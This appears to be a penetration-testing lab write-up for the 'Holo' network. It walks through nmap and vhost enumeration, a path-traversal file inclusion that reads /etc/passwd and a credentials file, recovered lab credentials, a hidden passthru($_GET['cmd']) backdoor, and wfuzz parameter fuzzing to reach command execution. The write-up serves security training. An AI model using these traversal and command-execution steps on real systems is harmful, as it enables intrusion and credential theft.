# Holo Live

## RECON

### ENUMERATE

#### NMAP

```text
DC-SRV01: 10.200.107.30

L-SRV01: 10.200.107.33 # web server + ssh

L-SRV02: 192.168.100.100

S-SRV01
S-SRV02

PC-FILESRV01
```

```sh
# nmap -sV -sC -p- -v -o nmap-hololive-10.200.107.0-24.txt 10.200.107.0/24

Scanning 2 hosts [65535 ports/host]
Discovered open port 80/tcp on 10.200.107.33
Discovered open port 22/tcp on 10.200.107.250
Discovered open port 22/tcp on 10.200.107.33


# 22/tcp on 10.200.107.250
debug1: Local version string SSH-2.0-OpenSSH_8.8p1 Debian-1                                                         
debug1: Remote protocol version 2.0, remote software version OpenSSH_7.6p1 Ubuntu-4ubuntu0.5                        
debug1: compat_banner: match: OpenSSH_7.6p1 Ubuntu-4ubuntu0.5 pat OpenSSH_7.0*,OpenSSH_7.1*,OpenSSH_7.2*,OpenSSH_7.3
*,OpenSSH_7.5*,OpenSSH_7.6*,OpenSSH_7.7* compat 0x04000002
```

```sh
# nmap -sV -sC -p- -v -o nmap-hololive-192.168.100.0-24.txt 192.168.100.0/24

```

#### GOBUSTER VHOST

vhost fuzzing.

set `/etc/hosts`

```sh
10.200.107.33   holo.live www.holo.live dev.holo.live admin.holo.live
```

Get this wordlist: [SecLists](https://github.com/danielmiessler/SecLists.git).

Do `gobuster` with `vhost`:

```sh
└─$ gobuster vhost -u holo.live -w ~/Documents/Lists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster-hololive-vhost.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://holo.live
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /home/kali/Documents/Lists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/03/20 19:28:03 Starting gobuster in VHOST enumeration mode
===============================================================
Found: www.holo.live (Status: 200) [Size: 21405]
Found: dev.holo.live (Status: 200) [Size: 7515] 
Found: admin.holo.live (Status: 200) [Size: 1845]
Found: gc._msdcs.holo.live (Status: 400) [Size: 422]
Found: _domainkey.holo.live (Status: 400) [Size: 422]
```

```sh
# http://www.holo.live/robots.txt:

User-Agent: *
Disallow: /var/www/wordpress/index.php
Disallow: /var/www/wordpress/readme.html
Disallow: /var/www/wordpress/wp-activate.php
Disallow: /var/www/wordpress/wp-blog-header.php
Disallow: /var/www/wordpress/wp-config.php
Disallow: /var/www/wordpress/wp-content
Disallow: /var/www/wordpress/wp-includes
Disallow: /var/www/wordpress/wp-load.php
Disallow: /var/www/wordpress/wp-mail.php
Disallow: /var/www/wordpress/wp-signup.php
Disallow: /var/www/wordpress/xmlrpc.php
Disallow: /var/www/wordpress/license.txt
Disallow: /var/www/wordpress/upgrade
Disallow: /var/www/wordpress/wp-admin
Disallow: /var/www/wordpress/wp-comments-post.php
Disallow: /var/www/wordpress/wp-config-sample.php
Disallow: /var/www/wordpress/wp-cron.php
Disallow: /var/www/wordpress/wp-links-opml.php
Disallow: /var/www/wordpress/wp-login.php
Disallow: /var/www/wordpress/wp-settings.php
Disallow: /var/www/wordpress/wp-trackback.php

# http://admin.holo.live/robots.txt

User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt
```

NOTE: you need to fuzz ALL domains - admin, www and dev.

on `dev.holo.live` there is `img.php`:

### Local File inclusion

We want `/var/www/admin/supersecretdir/creds.txt` from `admin.holo.live` but we're going to go through `dev.holo.live/img.php` instead- cos they're all on the same host, just using vhost.

If this gets my password: `localhost/lfi.php?file=file=../../../../../../../../etc/passwd`

Then this should land the creds file: `dev.holo.live/img.php?file=../../../../../../../../var/www/admin/supersecretdir/creds.txt`

### admin creds

For `admin.holo.live`:

```sh
I know you forget things, so I'm leaving this note for you:
admin:DBManagerLogin!
- gurag <3
```

## Remote Code Execution

2 methods for finding RCE:

1. source code analysis i.e. "view source" and see if you can spot the usual suspects `$_GET['cmd']`.
2. fuzzing with wfuzz or gobuster

### source code analysis

Looking at `view-source:http://admin.holo.live/dashboard.php`:

```html
Visitors today</h4>
<!--//if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
</div>
```

This looks dodgy, looks like `cmd` is the parameter it will accept.

### fuzzing for remote code exec

Option if we maybe don't have source code access.

Lookup [wfuzz](https://wfuzz.readthedocs.io/en/latest/user/basicusage.html) and learn how it works.

Now that you can authN to admin, use cookies for authN wfuzz session.

We have the `dashboard.php` file which we will fuzz for what html parameter it accepts that we can use for Remote Code Execution (RCE).

```sh
└─$ wfuzz -u http://admin.holo.live/dashboard.php?FUZZ=ls+-la -b PHPSESSID=21cdlttlafq7klmnrpl3r266vs -w wordlist.txt --hw 2
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://admin.holo.live/dashboard.php?FUZZ=ls+-la
Total requests: 7

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                            
=====================================================================

000000003:   200        394 L    1052 W     15869 Ch    "bolo"                                             
000000001:   200        394 L    1052 W     15869 Ch    "hash"                                             
000000007:   200        394 L    1052 W     15869 Ch    "forest"                                           
000000006:   200        394 L    1052 W     15869 Ch    "last"                                             
000000002:   200        394 L    1052 W     15869 Ch    "cat"                                              
000000004:   200        394 L    1052 W     15869 Ch    "dior"                                             
000000005:   200        407 L    1170 W     16551 Ch    "cmd"                                              

Total time: 0.871835
Processed Requests: 7
Filtered Requests: 0
Requests/sec.: 8.029040
```

Explain:

- `-u http://admin.holo.live/dashboard.php?FUZZ=ls` trying to find the parameter for `FUZZ`
- `-b PHPSESSID=21cdlttlafq7klmnrpl3r266vs` its an admin page and needs an authN.
- `-w wordlist.txt` wordlist to use.
- `--hw 2`

My experiment here was a wordlist I know for sure has the correct parameter, so the way to tell the correct from the rest of the results (all returned `200 OK`), and you can see the returned lines for the `cmd` parameter is different from the rest.

[cmd=ls](http://admin.holo.live/dashboard.php?cmd=ls)